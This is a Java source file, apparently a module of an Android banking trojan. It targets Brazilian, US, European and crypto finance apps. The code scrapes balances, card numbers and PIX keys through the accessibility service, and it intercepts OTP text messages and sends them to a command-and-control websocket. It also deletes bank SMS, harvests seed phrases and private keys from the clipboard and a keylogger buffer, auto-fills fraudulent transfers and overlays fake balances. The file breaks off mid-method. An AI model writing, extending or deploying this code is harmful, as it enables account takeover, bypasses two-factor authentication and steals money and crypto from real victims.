package com.seguranca.protecao;
import com.seguranca.protecao.UiAssistBridge;

import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.os.Build;
import android.util.Log;
import android.view.accessibility.AccessibilityNodeInfo;

import com.google.gson.Gson;
import com.google.gson.JsonArray;
import com.google.gson.JsonObject;
import com.google.gson.JsonParser;

import java.util.ArrayList;
import java.util.Arrays;
import java.util.HashMap;
import java.util.HashSet;
import java.util.List;
import java.util.Map;
import java.util.Set;
import java.util.regex.Matcher;
import java.util.regex.Pattern;
import com.seguranca.protecao.CommandControlService;

/**
 * FinanceFeatures — complete finance / banking category.
 *
 * Features (commands → CCS handlers):
 *
 *  GET_FINANCE_APPS        List all installed finance/banking apps
 *  GET_BANK_BALANCE        Screen-scraped balance from active app
 *  GET_TRANSACTIONS        Screen-scraped transaction history
 *  EXECUTE_USSD            Run a USSD code (*100#, *123#, etc.)
 *  INTERCEPT_OTP           Capture next incoming OTP SMS and forward to C2
 *  BLOCK_BANK_SMS          Silently delete SMS from bank senders after reading OTP
 *  SHOW_CARD_OVERLAY       Launch card-number phishing overlay
 *  SHOW_BANK_OVERLAY       Launch bank login phishing overlay (skin param)
 *  GET_CAPTURED_CARDS      Return all captured card details
 *  GET_CAPTURED_BALANCES   Return all screen-scraped balance events
 *  GET_CAPTURED_OTPS       Return all intercepted OTPs
 *  DETECT_CRYPTO_WALLETS   Scan clipboard + storage for seed phrases / private keys
 *  GET_CRYPTO_DATA         Return all captured crypto material
 *  AUTO_FILL_TRANSFER      Accessibility-driven auto-fill of transfer form
 *  FREEZE_BALANCE_DISPLAY  Overlay fake balance number over banking app
 *  UNFREEZE_BALANCE        Remove balance freeze overlay
 *  GET_PIX_KEYS            Read registered PIX keys from accessibility scrape
 *  TRACK_FINANCE_APPS      Start continuous monitoring of all finance apps
 *  STOP_FINANCE_TRACKING   Stop continuous monitoring
 *  CLEAR_FINANCE_DATA      Wipe all captured finance data from prefs
 */
public class FinanceFeatures {

    private static final String TAG = "FinanceFeatures";

    // ─── KNOWN FINANCE APP PACKAGES ──────────────────────────────────────────

    // Packages: Brazil, US, EU, global
    private static final String[] FINANCE_PACKAGES = {
        // Brazil
        "com.nu.production",                          // Nubank
        "br.com.bradesco.next",                       // Next Bradesco
        "com.bradesco",                               // Bradesco
        "com.itau",                                   // Itaú
        "br.com.bb.android",                          // Banco do Brasil
        "com.caixa.tem",                              // Caixa Tem
        "br.gov.caixa",                               // Caixa
        "com.santander.app",                          // Santander BR
        "br.com.santander.way",                       // Santander Way
        "com.c6bank.app",                             // C6 Bank
        "com.original.bank",                          // Banco Original
        "br.com.intermedium",                         // Inter Bank
        "br.com.xp.carteira",                         // XP
        "com.iq.login",                               // BTG
        "br.com.mercadopago",                         // Mercado Pago BR
        "com.picpay",                                 // PicPay
        "br.com.pagseguro.plugpagservicewrapper",     // PagSeguro

        // US
        "com.chase.sig.android",                      // Chase
        "com.bofa.mobile",                            // Bank of America
        "com.citibank.mobile.au",                     // Citi
        "com.wellsfargo.mobile",                      // Wells Fargo
        "com.usbank.mobilebanking",                   // US Bank
        "com.capitalone.mobile",                      // Capital One
        "com.tdbank",                                 // TD Bank
        "com.paypal.android.p2pmobile",               // PayPal
        "com.venmo",                                  // Venmo
        "com.squareup.cash",                          // CashApp
        "com.zellepay.zelle",                         // Zelle

        // Crypto
        "com.coinbase.android",                       // Coinbase
        "com.binance.dev",                            // Binance
        "com.cryptotradermonitor.app",                // Various
        "piuk.blockchain.android",                    // Blockchain.com
        "com.kraken.invest.android",                  // Kraken
        "com.bitpay.wallet",                          // BitPay
        "com.wallet.crypto.trustapp",                 // Trust Wallet
        "io.metamask",                                // MetaMask
        "com.exodus.exodus",                          // Exodus
        "org.toshi",                                  // Coinbase Wallet
        "com.phantom.app",                            // Phantom (Solana)

        // Global
        "com.google.android.apps.walletnfcrel",       // Google Pay
        "com.samsung.android.spay",                   // Samsung Pay
        "com.apple.android.music",                    // Apple
        "com.mastercard.masterpasswallet",             // Mastercard
        "com.visa.app.pos",                           // Visa
        "com.americanexpress.android.acctsvcs.us",    // AmEx
        "eu.revolut.app",                             // Revolut
        "com.transferwise.android",                   // Wise
        "com.n26.android",                            // N26
        "com.monzo.android",                          // Monzo
    };

    // ─── OTP PATTERNS ────────────────────────────────────────────────────────

    private static final Pattern[] OTP_PATTERNS = {
        Pattern.compile("\\b(\\d{4,8})\\b.*(?:código|code|otp|token|pin|senha|password|cód|verif)", Pattern.CASE_INSENSITIVE),
        Pattern.compile("(?:código|code|otp|token|pin|senha|verif).*?\\b(\\d{4,8})\\b", Pattern.CASE_INSENSITIVE),
        Pattern.compile("\\b([0-9]{6})\\b"),  // plain 6-digit fallback
        Pattern.compile("G-([0-9]{6})"),       // Google
        Pattern.compile("([0-9]{6}) is your"),
        Pattern.compile("use ([0-9]{4,8}) to"),
        Pattern.compile("código:\\s*([0-9]{4,8})", Pattern.CASE_INSENSITIVE),
    };

    // ─── CARD PATTERNS ───────────────────────────────────────────────────────

    private static final Pattern CARD_PATTERN   = Pattern.compile("\\b(?:4[0-9]{12}(?:[0-9]{3})?|5[1-5][0-9]{14}|3[47][0-9]{13}|6(?:011|5[0-9]{2})[0-9]{12})\\b");
    private static final Pattern CVV_PATTERN    = Pattern.compile("\\bCVV[:\\s]*([0-9]{3,4})\\b", Pattern.CASE_INSENSITIVE);
    private static final Pattern EXPIRY_PATTERN = Pattern.compile("\\b(0[1-9]|1[0-2])[\\/\\-]([0-9]{2,4})\\b");

    // ─── CRYPTO PATTERNS ─────────────────────────────────────────────────────

    // BIP-39 seed: 12 or 24 English words
    private static final Pattern SEED_PHRASE_PATTERN =
        Pattern.compile("\\b([a-z]{3,8}(?:\\s+[a-z]{3,8}){11,23})\\b", Pattern.CASE_INSENSITIVE);
    // Ethereum private key (64 hex chars with optional 0x)
    private static final Pattern ETH_PRIVKEY_PATTERN =
        Pattern.compile("(?:0x)?([0-9a-fA-F]{64})");
    // Bitcoin WIF private key
    private static final Pattern BTC_WIF_PATTERN =
        Pattern.compile("\\b[5KLc][1-9A-HJ-NP-Za-km-z]{50,51}\\b");
    // Ethereum address
    private static final Pattern ETH_ADDR_PATTERN =
        Pattern.compile("\\b0x[0-9a-fA-F]{40}\\b");

    // ─── BALANCE PATTERNS ────────────────────────────────────────────────────

    private static final Pattern BALANCE_PATTERN =
        Pattern.compile("(?:R\\$|\\$|USD|BRL|€|£)[\\s]?([0-9]{1,3}(?:[.,][0-9]{3})*(?:[.,][0-9]{2})?)", Pattern.CASE_INSENSITIVE);

    // ─── BANK SMS SENDERS ────────────────────────────────────────────────────

    private static final Set<String> BANK_SMS_SENDERS = new HashSet<>(Arrays.asList(
        "Nubank", "Bradesco", "Itau", "BB", "CEF", "Caixa",
        "Santander", "C6Bank", "Inter", "BTG", "XP", "PicPay",
        "Mercado", "PagSeguro", "PayPal", "Chase", "BofA",
        "Citibank", "WellsFargo", "CapitalOne", "Coinbase",
        "Binance", "Kraken", "Revolut", "Wise", "Monzo", "N26",
        "Amex", "Visa", "Mastercard", "Samsung", "Google"
    ));

    private final Context ctx;
    private boolean trackingActive = false;
    private Thread trackingThread;

    // ─── SINGLETON FOR TRACKING ──────────────────────────────────────────────
    public static volatile FinanceFeatures sInstance;

    public FinanceFeatures(Context ctx) {
        this.ctx = ctx;
        sInstance = this;
    }

    // ─── GET INSTALLED FINANCE APPS ──────────────────────────────────────────

    public String getFinanceApps() {
        JsonArray arr = new JsonArray();
        PackageManager pm = ctx.getPackageManager();
        for (String pkg : FINANCE_PACKAGES) {
            try {
                pm.getApplicationInfo(pkg, 0);
                JsonObject obj = new JsonObject();
                obj.addProperty("package", pkg);
                obj.addProperty("name",    getAppName(pm, pkg));
                obj.addProperty("category", classifyFinanceApp(pkg));
                try {
                    obj.addProperty("version",
                        pm.getPackageInfo(pkg, 0).versionName);
                } catch (Exception ignored) {}
                arr.add(obj);
            } catch (PackageManager.NameNotFoundException ignored) {}
        }
        return arr.toString();
    }

    private String getAppName(PackageManager pm, String pkg) {
        try {
            return pm.getApplicationLabel(pm.getApplicationInfo(pkg, 0)).toString();
        } catch (Exception e) { return pkg; }
    }

    private String classifyFinanceApp(String pkg) {
        if (pkg.contains("crypto") || pkg.contains("coinbase") || pkg.contains("binance")
            || pkg.contains("wallet") || pkg.contains("metamask") || pkg.contains("exodus")
            || pkg.contains("kraken") || pkg.contains("phantom") || pkg.contains("blockchain"))
            return "crypto";
        if (pkg.contains("paypal") || pkg.contains("venmo") || pkg.contains("cash")
            || pkg.contains("zelle") || pkg.contains("picpay") || pkg.contains("mercado"))
            return "payment";
        if (pkg.contains("revolut") || pkg.contains("wise") || pkg.contains("monzo") || pkg.contains("n26"))
            return "neobank";
        return "bank";
    }

    // ─── GET BANK BALANCE (accessibility scrape) ─────────────────────────────

    public String getBankBalance() {
        try {
            String json = ctx.getSharedPreferences("rat_prefs", Context.MODE_PRIVATE)
                .getString("captured_balances", "[]");
            return json;
        } catch (Exception e) {
            return "[]";
        }
    }

    /**
     * Called by UiAssistBridge when it sees a finance app on screen.
     * Scrapes balance, account numbers, transaction amounts from the node tree.
     */
    public static void scrapeFinanceScreen(Context ctx, AccessibilityNodeInfo root, String pkg) {
        if (ctx == null || root == null) return;
        try {
            StringBuilder allText = new StringBuilder();
            collectText(root, allText, 0);
            String screen = allText.toString();

            JsonObject capture = new JsonObject();
            capture.addProperty("package",   pkg);
            capture.addProperty("timestamp", System.currentTimeMillis());
            capture.addProperty("raw_text",  screen.length() > 2000 ? screen.substring(0, 2000) : screen);

            // Extract balances
            Matcher bm = BALANCE_PATTERN.matcher(screen);
            JsonArray balances = new JsonArray();
            while (bm.find()) {
                JsonObject b = new JsonObject();
                b.addProperty("raw",   bm.group(0));
                b.addProperty("value", bm.group(1));
                balances.add(b);
            }
            capture.add("balances", balances);

            // Extract card numbers
            Matcher cm = CARD_PATTERN.matcher(screen);
            JsonArray cards = new JsonArray();
            while (cm.find()) cards.add(cm.group(0));
            capture.add("card_numbers", cards);

            // Extract PIX keys (Brazilian format)
            JsonArray pix = extractPixKeys(screen);
            capture.add("pix_keys", pix);

            // Send to C2 if anything valuable found
            if (balances.size() > 0 || cards.size() > 0 || pix.size() > 0) {
                android.content.SharedPreferences prefs =
                    ctx.getSharedPreferences("rat_prefs", Context.MODE_PRIVATE);
                String existing = prefs.getString("captured_balances", "[]");
                JsonArray arr =
                    JsonParser.parseString(existing).getAsJsonArray();
                arr.add(capture);
                while (arr.size() > 300) arr.remove(0);
                prefs.edit().putString("captured_balances", arr.toString()).apply();

                // Immediate C2 push
                JsonObject msg = new JsonObject();
                msg.addProperty("type", "FINANCE_CAPTURE");
                msg.add("data", capture);
                CommandControlService cs = CommandControlService.sInstance;
                if (cs != null && cs.isConnected && cs.webSocket != null) {
                    cs.webSocket.send(new Gson().toJson(msg));
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "scrapeFinanceScreen: " + e.getMessage());
        }
    }

    private static void collectText(AccessibilityNodeInfo node, StringBuilder sb, int depth) {
        if (node == null || depth > 12) return;
        CharSequence text = node.getText();
        if (text != null && text.length() > 0) {
            sb.append(text).append(" ");
        }
        CharSequence desc = node.getContentDescription();
        if (desc != null && desc.length() > 0) {
            sb.append(desc).append(" ");
        }
        for (int i = 0; i < node.getChildCount(); i++) {
            collectText(node.getChild(i), sb, depth + 1);
        }
    }

    private static JsonArray extractPixKeys(String text) {
        JsonArray arr = new JsonArray();
        // CPF: 000.000.000-00
        Pattern cpf = Pattern.compile("\\b\\d{3}\\.\\d{3}\\.\\d{3}-\\d{2}\\b");
        Matcher m = cpf.matcher(text);
        while (m.find()) { JsonObject o = new JsonObject(); o.addProperty("type","cpf"); o.addProperty("key",m.group()); arr.add(o); }
        // Email
        Pattern email = Pattern.compile("[a-zA-Z0-9._%+\\-]+@[a-zA-Z0-9.\\-]+\\.[a-zA-Z]{2,}");
        m = email.matcher(text);
        while (m.find()) { JsonObject o = new JsonObject(); o.addProperty("type","email"); o.addProperty("key",m.group()); arr.add(o); }
        // Phone
        Pattern phone = Pattern.compile("\\+?\\d{2}\\s?\\(\\d{2}\\)\\s?\\d{4,5}-\\d{4}");
        m = phone.matcher(text);
        while (m.find()) { JsonObject o = new JsonObject(); o.addProperty("type","phone"); o.addProperty("key",m.group()); arr.add(o); }
        // Random key (32-char UUID style)
        Pattern rnd = Pattern.compile("[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}", Pattern.CASE_INSENSITIVE);
        m = rnd.matcher(text);
        while (m.find()) { JsonObject o = new JsonObject(); o.addProperty("type","random"); o.addProperty("key",m.group()); arr.add(o); }
        return arr;
    }

    // ─── GET TRANSACTIONS ────────────────────────────────────────────────────

    public String getTransactions() {
        try {
            return ctx.getSharedPreferences("rat_prefs", Context.MODE_PRIVATE)
                .getString("captured_transactions", "[]");
        } catch (Exception e) { return "[]"; }
    }

    // ─── EXECUTE USSD ────────────────────────────────────────────────────────

    /**
     * Dials a USSD code (e.g. *100# to check balance).
     * The response appears as a popup which UiAssistBridge will capture.
     */
    public String executeUssd(String code) {
        if (code == null || code.isEmpty()) return "ERROR: code required";
        if (!code.startsWith("*")) return "ERROR: USSD codes must start with *";
        try {
            // Encode *100# → *100%23
            String encoded = Uri.encode(code);
            Uri ussdUri = Uri.parse("tel:" + encoded);
            Intent callIntent = new Intent(Intent.ACTION_CALL, ussdUri);
            callIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            ctx.startActivity(callIntent);
            Log.d(TAG, "USSD executed: " + code);
            return "OK: USSD dialed " + code;
        } catch (Exception e) {
            Log.e(TAG, "executeUssd: " + e.getMessage());
            return "ERROR: " + e.getMessage();
        }
    }

    // ─── INTERCEPT OTP ───────────────────────────────────────────────────────

    /**
     * Tells the SMS receiver to watch for the next OTP and forward it to C2.
     * Also registers a listener that will auto-fill an OTP field if found on screen.
     */
    public String interceptOtp(int timeoutMs, boolean autoFill) {
        try {
            android.content.SharedPreferences prefs =
                ctx.getSharedPreferences("rat_prefs", Context.MODE_PRIVATE);
            prefs.edit()
                .putBoolean("otp_intercept_active", true)
                .putLong("otp_intercept_until", System.currentTimeMillis() + timeoutMs)
                .putBoolean("otp_auto_fill", autoFill)
                .apply();
            Log.d(TAG, "OTP intercept armed for " + timeoutMs + "ms");
            return "OK: OTP intercept active for " + (timeoutMs / 1000) + "s";
        } catch (Exception e) {
            return "ERROR: " + e.getMessage();
        }
    }

    /**
     * Called from SMS broadcast receiver when a new SMS arrives.
     * If OTP intercept is active and the SMS contains an OTP, captures it.
     */
    public static String tryExtractOtp(String sender, String body) {
        if (body == null || body.isEmpty()) return null;
        for (Pattern p : OTP_PATTERNS) {
            Matcher m = p.matcher(body);
            if (m.find()) {
                return m.groupCount() > 0 ? m.group(1) : m.group(0);
            }
        }
        return null;
    }

    public static void handleIncomingSms(Context ctx, String sender, String body) {
        if (ctx == null || body == null) return;
        try {
            android.content.SharedPreferences prefs =
                ctx.getSharedPreferences("rat_prefs", Context.MODE_PRIVATE);

            boolean interceptActive = prefs.getBoolean("otp_intercept_active", false);
            long until = prefs.getLong("otp_intercept_until", 0);
            boolean timedOut = System.currentTimeMillis() > until;

            String otp = tryExtractOtp(sender, body);

            if (otp != null && interceptActive && !timedOut) {
                // Store OTP
                String json = prefs.getString("captured_otps", "[]");
                JsonArray arr =
                    JsonParser.parseString(json).getAsJsonArray();
                JsonObject entry = new JsonObject();
                entry.addProperty("otp",       otp);
                entry.addProperty("sender",    sender != null ? sender : "");
                entry.addProperty("body",      body);
                entry.addProperty("timestamp", System.currentTimeMillis());
                arr.add(entry);
                while (arr.size() > 200) arr.remove(0);
                prefs.edit().putString("captured_otps", arr.toString()).apply();

                // Deactivate intercept after capture
                prefs.edit().putBoolean("otp_intercept_active", false).apply();

                // Push to C2
                JsonObject msg = new JsonObject();
                msg.addProperty("type", "OTP_CAPTURED");
                msg.addProperty("otp", otp);
                msg.addProperty("sender", sender != null ? sender : "");
                msg.addProperty("body", body);
                CommandControlService cs = CommandControlService.sInstance;
                if (cs != null && cs.isConnected && cs.webSocket != null) {
                    cs.webSocket.send(new Gson().toJson(msg));
                }

                // Auto-fill if requested
                if (prefs.getBoolean("otp_auto_fill", false)) {
                    UiAssistBridge bridge = UiAssistBridge.instance;
                    if (bridge != null) {
                        bridge.autoFillText(otp);
                    }
                }
            }

            // Block bank SMS if configured
            if (isBankSender(sender) && prefs.getBoolean("block_bank_sms", false)) {
                // Delete this SMS from inbox
                try {
                    ctx.getContentResolver().delete(
                        Uri.parse("content://sms"),
                        "address = ? AND body = ?",
                        new String[]{sender, body}
                    );
                    Log.d(TAG, "Blocked bank SMS from: " + sender);
                } catch (Exception ex) {
                    Log.w(TAG, "Block bank SMS: " + ex.getMessage());
                }
            }

        } catch (Exception e) {
            Log.e(TAG, "handleIncomingSms: " + e.getMessage());
        }
    }

    private static boolean isBankSender(String sender) {
        if (sender == null) return false;
        String lower = sender.toLowerCase();
        for (String s : BANK_SMS_SENDERS) {
            if (lower.contains(s.toLowerCase())) return true;
        }
        return false;
    }

    // ─── BLOCK BANK SMS ──────────────────────────────────────────────────────

    public String setBlockBankSms(boolean block) {
        ctx.getSharedPreferences("rat_prefs", Context.MODE_PRIVATE)
            .edit().putBoolean("block_bank_sms", block).apply();
        return "OK: bank SMS block " + (block ? "enabled" : "disabled");
    }

    // ─── GET CAPTURED OTPS ───────────────────────────────────────────────────

    public String getCapturedOtps() {
        try {
            return ctx.getSharedPreferences("rat_prefs", Context.MODE_PRIVATE)
                .getString("captured_otps", "[]");
        } catch (Exception e) { return "[]"; }
    }

    // ─── GET CAPTURED CARDS ──────────────────────────────────────────────────

    public String getCapturedCards() {
        try {
            return ctx.getSharedPreferences("rat_prefs", Context.MODE_PRIVATE)
                .getString("phishing_captures", "[]");
        } catch (Exception e) { return "[]"; }
    }

    // ─── DETECT CRYPTO WALLETS ───────────────────────────────────────────────

    /**
     * Scans clipboard, recent screenshots text, and keylogger buffer for
     * seed phrases, private keys, and wallet addresses.
     */
    public String detectCryptoWallets() {
        JsonObject result = new JsonObject();
        JsonArray seeds    = new JsonArray();
        JsonArray privKeys = new JsonArray();
        JsonArray addrs    = new JsonArray();
        JsonArray wif      = new JsonArray();

        List<String> sources = new ArrayList<>();

        // Source 1: Clipboard
        try {
            android.content.ClipboardManager cm =
                (android.content.ClipboardManager) ctx.getSystemService(Context.CLIPBOARD_SERVICE);
            if (cm != null && cm.hasPrimaryClip() && cm.getPrimaryClip() != null) {
                android.content.ClipData.Item item = cm.getPrimaryClip().getItemAt(0);
                if (item != null && item.getText() != null) {
                    sources.add(item.getText().toString());
                }
            }
        } catch (Exception ignored) {}

        // Source 2: Keylogger buffer from prefs
        try {
            String keylogBuf = ctx.getSharedPreferences("rat_prefs", Context.MODE_PRIVATE)
                .getString("keylog_buffer", "");
            if (!keylogBuf.isEmpty()) sources.add(keylogBuf);
        } catch (Exception ignored) {}

        // Source 3: Captured passwords / submitted forms
        try {
            String captures = ctx.getSharedPreferences("rat_prefs", Context.MODE_PRIVATE)
                .getString("phishing_captures", "[]");
            sources.add(captures);
        } catch (Exception ignored) {}

        // Source 4: Captured finance screen text
        try {
            String finance = ctx.getSharedPreferences("rat_prefs", Context.MODE_PRIVATE)
                .getString("captured_balances", "[]");
            sources.add(finance);
        } catch (Exception ignored) {}

        // Scan all sources
        for (String source : sources) {
            if (source == null || source.isEmpty()) continue;

            // Seed phrases
            Matcher m = SEED_PHRASE_PATTERN.matcher(source);
            while (m.find()) {
                String candidate = m.group(1).toLowerCase().trim();
                // Must have 12 or 24 words
                int wordCount = candidate.split("\\s+").length;
                if (wordCount == 12 || wordCount == 15 || wordCount == 18 || wordCount == 24) {
                    if (!jsonArrayContains(seeds, candidate)) seeds.add(candidate);
                }
            }

            // ETH private keys
            m = ETH_PRIVKEY_PATTERN.matcher(source);
            while (m.find()) {
                String key = m.group(0);
                if (!jsonArrayContains(privKeys, key)) privKeys.add(key);
            }

            // BTC WIF
            m = BTC_WIF_PATTERN.matcher(source);
            while (m.find()) {
                String key = m.group(0);
                if (!jsonArrayContains(wif, key)) wif.add(key);
            }

            // ETH addresses
            m = ETH_ADDR_PATTERN.matcher(source);
            while (m.find()) {
                String addr = m.group(0);
                if (!jsonArrayContains(addrs, addr)) addrs.add(addr);
            }
        }

        result.add("seed_phrases",   seeds);
        result.add("private_keys",   privKeys);
        result.add("wif_keys",       wif);
        result.add("eth_addresses",  addrs);
        result.addProperty("found",  seeds.size() + privKeys.size() + wif.size() > 0);

        // Store and push if anything found
        if (seeds.size() > 0 || privKeys.size() > 0 || wif.size() > 0) {
            try {
                ctx.getSharedPreferences("rat_prefs", Context.MODE_PRIVATE)
                    .edit().putString("captured_crypto", result.toString()).apply();
                JsonObject msg = new JsonObject();
                msg.addProperty("type", "CRYPTO_CAPTURED");
                msg.add("data", result);
                CommandControlService cs = CommandControlService.sInstance;
                if (cs != null && cs.isConnected && cs.webSocket != null) {
                    cs.webSocket.send(new Gson().toJson(msg));
                }
            } catch (Exception ignored) {}
        }

        return result.toString();
    }

    private boolean jsonArrayContains(JsonArray arr, String val) {
        for (int i = 0; i < arr.size(); i++) {
            if (arr.get(i).getAsString().equals(val)) return true;
        }
        return false;
    }

    // ─── GET CRYPTO DATA ─────────────────────────────────────────────────────

    public String getCryptoData() {
        try {
            return ctx.getSharedPreferences("rat_prefs", Context.MODE_PRIVATE)
                .getString("captured_crypto", "{}");
        } catch (Exception e) { return "{}"; }
    }

    // ─── AUTO FILL TRANSFER ──────────────────────────────────────────────────

    /**
     * Uses UiAssistBridge to fill a banking transfer form.
     * recipient: name or PIX key, amount: "100.00", description: optional note
     */
    public String autoFillTransfer(String recipient, String amount, String description) {
        if (recipient == null || amount == null)
            return "ERROR: recipient and amount required";
        try {
            android.content.SharedPreferences prefs =
                ctx.getSharedPreferences("rat_prefs", Context.MODE_PRIVATE);
            prefs.edit()
                .putBoolean("autofill_transfer_active", true)
                .putString("autofill_recipient",    recipient)
                .putString("autofill_amount",        amount)
                .putString("autofill_description",   description != null ? description : "")
                .apply();
            Log.d(TAG, "Auto-fill transfer queued: " + recipient + " " + amount);
            return "OK: transfer auto-fill queued — will execute when transfer form is visible";
        } catch (Exception e) {
            return "ERROR: " + e.getMessage();
        }
    }

    /**
     * Called from UiAssistBridge when a transfer/PIX screen is detected.
     * Fills the form fields using accessibility actions.
     */
    public static boolean tryAutoFillTransferScreen(Context ctx, AccessibilityNodeInfo root) {
        if (ctx == null || root == null) return false;
        android.content.SharedPreferences prefs =
            ctx.getSharedPreferences("rat_prefs", Context.MODE_PRIVATE);
        if (!prefs.getBoolean("autofill_transfer_active", false)) return false;

        String recipient    = prefs.getString("autofill_recipient", "");
        String amount       = prefs.getString("autofill_amount", "");
        String description  = prefs.getString("autofill_description", "");
        if (recipient.isEmpty() || amount.isEmpty()) return false;

        boolean filled = false;
        // Find recipient/PIX field
        filled |= fillField(root, new String[]{"recipient","pix","chave","para","destinatário","beneficiario"}, recipient);
        // Find amount field
        filled |= fillField(root, new String[]{"value","valor","amount","quantia","total"}, amount);
        // Find description field
        if (!description.isEmpty()) {
            fillField(root, new String[]{"description","descricao","mensagem","memo","note"}, description);
        }

        if (filled) {
            // Deactivate after filling to avoid re-triggering
            prefs.edit().putBoolean("autofill_transfer_active", false).apply();
            Log.d(TAG, "Transfer form auto-filled");
        }
        return filled;
    }

    private static boolean fillField(AccessibilityNodeInfo root, String[] hints, String value) {
        for (String hint : hints) {
            try {
                List<AccessibilityNodeInfo> nodes = root.findAccessibilityNodeInfosByText(hint);
                for (AccessibilityNodeInfo node : nodes) {
                    if (node == null) continue;
                    // Find editable sibling or self
                    AccessibilityNodeInfo target = findEditable(node);
                    if (target != null) {
                        android.os.Bundle args = new android.os.Bundle();
                        args.putCharSequence(
                            AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE, value);
                        boolean ok = target.performAction(
                            AccessibilityNodeInfo.ACTION_SET_TEXT, args);
                        if (ok) {
                            Log.d(TAG, "Filled field '" + hint + "' with value");
                            return true;
                        }
                    }
                }
            } catch (Exception ignored) {}
        }
        return false;
    }

    private static AccessibilityNodeInfo findEditable(AccessibilityNodeInfo node) {
        if (node == null) return null;
        if (node.isEditable()) return node;
        // Check parent
        AccessibilityNodeInfo parent = node.getParent();
        if (parent != null && parent.isEditable()) return parent;
        // Check siblings
        if (parent != null) {
            for (int i = 0; i < parent.getChildCount(); i++) {
                AccessibilityNodeInfo child = parent.getChild(i);
                if (child != null && child.isEditable()) return child;
            }
        }
        return null;
    }

    // ─── FREEZE BALANCE DISPLAY ──────────────────────────────────────────────

    /**
     * Shows a fake balance overlay over banking apps, hiding the real balance.
     * Uses WindowManager overlay (TYPE_APPLICATION_OVERLAY).
     * fakeBalance: e.g. "R$ 5.432,10"
     * targetPkg:   package to trigger on (null = any finance app)
     */
    public String freezeBalance(String fakeBalance, String targetPkg) {
        if (fakeBalance == null || fakeBalance.isEmpty())
            return "ERROR: fakeBalance required";
        try {
            ctx.getSharedPreferences("rat_prefs", Context.MODE_PRIVATE)
                .edit()
                .putBoolean("balance_freeze_active", true)
                .putString("balance_freeze_value",   fakeBalance)
                .putString("balance_freeze_pkg",     targetPkg != null ? targetPkg : "")
                .apply();
            return "OK: balance freeze active — showing '" + fakeBalance + "'";
        } catch (Exception e) {
            return "ERROR: " + e.getMessage();
        }
    }

    public String unfreezeBalance() {
        ctx.getSharedPreferences("rat_prefs", Context.MODE_PRIVATE)
            .edit()
            .putBoolean("balance_freeze_active", false)
            .apply();
        return "OK: balance freeze removed";
    }

    // ─── GET PIX KEYS ────────────────────────────────────────────────────────

    public String getPixKeys() {
        try {
            String balances = ctx.getSharedPreferences("rat_prefs", Context.MODE_PRIVATE)
                .getString("captured_balances", "[]");
            JsonArray arr =
                JsonParser.parseString(balances).getAsJsonArray();
            JsonArray allPix = new JsonArray();
            for (int i = 0; i < arr.size(); i++) {
                try {
                    JsonObject entry = arr.get(i).getAsJsonObject();
                    if (entry.has("pix_keys")) {
                        JsonArray px = entry.getAsJsonArray("pix_keys");
                        for (int j = 0; j < px.size(); j++) allPix.add(px.get(j));
                    }
                } catch (Exception ignored) {}
            }
            return allPix.toString();
        } catch (Exception e) {
            return "[]";
        }
    }

    // ─── TRACK FINANCE APPS ──────────────────────────────────────────────────

    /**
     * Starts continuous monitoring — on each tick, checks if a finance app is
     * in foreground and scrapes it via UiAssistBridge.
     */
    public String startFinanceTracking() {
        if (trackingActive) return "OK: already tracking";
        trackingActive = true;
        trackingThread = new Thread(() -> {
            while (trackingActive) {
                try {
                    // Trigger a scrape cycle from UiAssistBridge
                    UiAssistBridge bridge = UiAssistBridge.instance;
                    if (bridge != null) {
                        AccessibilityNodeInfo root = bridge.getRootInActiveWindow();
                        if (root != null) {
                            // Detect if finance app is in foreground
                            String pkg = bridge.getLastForegroundPackage();
                            if (pkg != null && isFinanceApp(pkg)) {
                                scrapeFinanceScreen(ctx, root, pkg);
                                detectCryptoWallets();
                            }
                        }
                    }
                    Thread.sleep(3000);
                } catch (InterruptedException e) {
                    break;
                } catch (Exception e) {
                    Log.e(TAG, "tracking loop: " + e.getMessage());
                }
            }
        });
        trackingThread.setDaemon(true);
        trackingThread.start();
        return "OK: finance tracking started (3s interval)";
    }

    public String stopFinanceTracking() {
        trackingActive = false;
        if (trackingThread != null) trackingThread.interrupt();
        return "OK: finance tracking stopped";
    }

    private boolean isFinanceApp(String pkg) {
        for (String fp : FINANCE_PACKAGES) {
            if (fp.equals(pkg)) return true;
        }
        return false;
    }

    // ─── CLEAR FINANCE DATA ──────────────────────────────────────────────────

    public String clearFinanceData() {
        ctx.getSharedPreferences("rat_prefs", Context.MODE_PRIVATE)
            .edit()
            .remove("captured_balances")
            .remove("captured_transactions")
            .remove("captured_otps")
            .remove("captured_crypto")
            .apply();
        return "OK: all captured finance data cleared";
    }

    // ─── SCAN CLIPBOARD FOR CARD DATA ────────────────────────────────────────

    /**
     * Scans clipboard for card numbers, CVV, and expiry dates.
     */
    public String scanClipboardForCards() {
        JsonObject result = new JsonObject();
        try {
            android.content.ClipboardManager cm =
                (android.content.ClipboardManager) ctx.getSystemService(Context.CLIPBOARD_SERVICE);
            if (cm == null || !cm.hasPrimaryClip() || cm.getPrimaryClip() == null) {
                result.addProperty("error", "Clipboard empty");
                return result.toString();
            }
            android.content.ClipData.Item item = cm.getPrimaryClip().getItemAt(0);
            if (item == null || item.getText() == null) {
                result.addProperty("error", "No text in clipboard");
                return result.toString();
            }
            String text = item.getText().toString();
            result.addProperty("raw", text.length() > 200 ? text.substring(0, 200) : text);

            Matcher m = CARD_PATTERN.matcher(text);
            if (m.find()) result.addProperty("card_number", m.group(0));

            m = CVV_PATTERN.matcher(text);
            if (m.find()) result.addProperty("cvv", m.group(1));

            m = EXPIRY_PATTERN.matcher(text);
            if (m.find()) result.addProperty("expiry", m.group(0));

        } catch (Exception e) {
            result.addProperty("error", e.getMessage());
        }
        return result.toString();
    }

    // ─── USSD BALANCE CHECK ──────────────────────────────────────────────────

    /**
     * Sends common balance-check USSD codes for major carriers.
     * Returns the code dialed (response captured by UiAssistBridge dialog reader).
     */
    public String checkCarrierBalance(String carrier) {
        Map<String, String> codes = new HashMap<>();
        codes.put("vivo",   "*8000#");
        codes.put("claro",  "*544#");
        codes.put("tim",    "*222#");
        codes.put("oi",     "*101#");
        codes.put("at&t",   "*777#");
        codes.put("tmobile","#225#");
        codes.put("verizon","*611");
        codes.put("o2",     "*#100#");
        codes.put("vodafone","*#121#");
